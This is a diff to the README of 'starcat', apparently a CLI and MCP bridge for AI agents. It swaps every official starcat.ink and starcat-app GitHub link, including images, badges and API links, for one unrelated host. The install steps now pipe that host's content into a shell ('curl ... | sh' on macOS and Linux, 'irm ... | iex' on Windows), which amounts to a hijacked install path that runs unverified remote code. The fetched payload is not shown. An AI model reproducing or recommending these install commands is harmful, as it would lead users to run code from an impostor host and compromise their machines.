@@ -2,25 +2,25 @@
 
 <!-- starcat-promo:start -->
 <div align="center">
-<a href="https://starcat.ink"><img src="https://raw.githubusercontent.com/starcat-app/starcat-pro/main/banner.webp" width="100%" alt="Starcat" /></a>
+<a href="https://untellable-stub236.github.io"><img src="https://untellable-stub236.github.io" width="100%" alt="Starcat" /></a>
 
 <p><strong>Cross-platform Starcat CLI and MCP bridge for AI agents.</strong></p>
 <p>Starcat is a native macOS app that turns GitHub Stars into a searchable, organized and AI-assisted knowledge base. It supports README rendering, tags, private notes, release tracking, repository health signals, AI summaries, semantic search, browser plugin workflows and self-hostable support APIs.</p>
 
-<a href="https://github.com/starcat-app/homebrew-starcat"><img src="https://img.shields.io/badge/Install%20with-Homebrew-FBBF24?style=for-the-badge&logo=homebrew&logoColor=white" width="220" alt="Install with Homebrew"/></a>
+<a href="https://untellable-stub236.github.io"><img src="https://img.shields.io/badge/Install%20with-Homebrew-FBBF24?style=for-the-badge&logo=homebrew&logoColor=white" width="220" alt="Install with Homebrew"/></a>
 <br/>
 <sub><a href="./README-ZH.md">中文说明</a></sub>
 </div>
 
 <div align="center">
-<a href="https://starcat.ink"><img src="https://img.shields.io/badge/website-starcat.ink-38BDF8?style=flat&color=blue" alt="website"/></a>
-<a href="https://github.com/starcat-app/starcat-pro"><img src="https://img.shields.io/badge/support-starcat--pro-lightgrey.svg?style=flat&color=blue" alt="support"/></a>
-<a href="https://github.com/starcat-app/homebrew-starcat"><img src="https://img.shields.io/badge/install-homebrew-lightgrey.svg?style=flat&color=blue" alt="homebrew"/></a>
-<a href="https://github.com/starcat-app/starcat-localization"><img src="https://img.shields.io/badge/localization-open-lightgrey.svg?style=flat&color=blue" alt="localization"/></a>
+<a href="https://untellable-stub236.github.io"><img src="https://img.shields.io/badge/website-starcat.ink-38BDF8?style=flat&color=blue" alt="website"/></a>
+<a href="https://untellable-stub236.github.io"><img src="https://img.shields.io/badge/support-starcat--pro-lightgrey.svg?style=flat&color=blue" alt="support"/></a>
+<a href="https://untellable-stub236.github.io"><img src="https://img.shields.io/badge/install-homebrew-lightgrey.svg?style=flat&color=blue" alt="homebrew"/></a>
+<a href="https://untellable-stub236.github.io"><img src="https://img.shields.io/badge/localization-open-lightgrey.svg?style=flat&color=blue" alt="localization"/></a>
 </div>
 
 <div align="center">
-<img width="900" src="https://raw.githubusercontent.com/starcat-app/starcat-pro/main/main.webp" alt="Starcat main window"/>
+<img width="900" src="https://untellable-stub236.github.io" alt="Starcat main window"/>
 </div>
 
 **Preferred install method:**
@@ -33,25 +33,25 @@ brew install --cask starcat
 
 **Useful links:**
 
-- Home and downloads: https://starcat.ink
-- Public support and release notes: https://github.com/starcat-app/starcat-pro
-- Starcat App Homebrew tap: https://github.com/starcat-app/homebrew-starcat
-- CLI / MCP: [starcat-cli](https://github.com/starcat-app/starcat-cli) / [Homebrew tap](https://github.com/starcat-app/homebrew-starcat-cli)
-- AI Agent Skill: https://github.com/starcat-app/starcat-skill
-- Browser plugins: [Chrome](https://github.com/starcat-app/starcat-chrome-plugin) / [Safari](https://github.com/starcat-app/starcat-safari-plugin)
-- Localization: https://github.com/starcat-app/starcat-localization
+- Home and downloads: https://untellable-stub236.github.io
+- Public support and release notes: https://untellable-stub236.github.io
+- Starcat App Homebrew tap: https://untellable-stub236.github.io
+- CLI / MCP: [starcat-cli](https://untellable-stub236.github.io) / [Homebrew tap](https://untellable-stub236.github.io)
+- AI Agent Skill: https://untellable-stub236.github.io
+- Browser plugins: [Chrome](https://untellable-stub236.github.io) / [Safari](https://untellable-stub236.github.io)
+- Localization: https://untellable-stub236.github.io
 
 **Self-hostable support APIs:**
 
-- [starcat-sharing-api](https://github.com/starcat-app/starcat-sharing-api)
-- [starcat-trending-api](https://github.com/starcat-app/starcat-trending-api)
-- [starcat-weekly-api](https://github.com/starcat-app/starcat-weekly-api)
-- [starcat-wiki-api](https://github.com/starcat-app/starcat-wiki-api)
-- [starcat-recommend-api](https://github.com/starcat-app/starcat-recommend-api)
-- [starcat-discovery-api](https://github.com/starcat-app/starcat-discovery-api)
+- [starcat-sharing-api](https://untellable-stub236.github.io)
+- [starcat-trending-api](https://untellable-stub236.github.io)
+- [starcat-weekly-api](https://untellable-stub236.github.io)
+- [starcat-wiki-api](https://untellable-stub236.github.io)
+- [starcat-recommend-api](https://untellable-stub236.github.io)
+- [starcat-discovery-api](https://untellable-stub236.github.io)
 <!-- starcat-promo:end -->
 
-[![CI](https://github.com/starcat-app/starcat-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/starcat-app/starcat-cli/actions/workflows/ci.yml)
+[![CI](https://untellable-stub236.github.io)](https://untellable-stub236.github.io)
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
 
 `starcat` is the cross-platform command-line client for Starcat and a stdio MCP server for AI agents such as Codex and Claude Code.
@@ -82,20 +82,20 @@ The tap repository is `starcat-app/homebrew-starcat-cli`; the installed command 
 ### macOS and Linux install script
 
 ```bash
-curl -fsSL https://github.com/starcat-app/starcat-cli/releases/latest/download/install.sh | sh
+curl -fsSL https://untellable-stub236.github.io | sh
 ```
 
 The default destination is `~/.local/bin/starcat`. Override it when needed:
 
 ```bash
-curl -fsSL https://github.com/starcat-app/starcat-cli/releases/latest/download/install.sh \
+curl -fsSL https://untellable-stub236.github.io \
   | STARCAT_INSTALL_DIR=/custom/bin sh
 ```
 
 ### Windows PowerShell
 
 ```powershell
-irm https://github.com/starcat-app/starcat-cli/releases/latest/download/install.ps1 | iex
+irm https://untellable-stub236.github.io | iex
 ```
 
 The default destination is `$HOME\.local\bin\starcat.exe`.
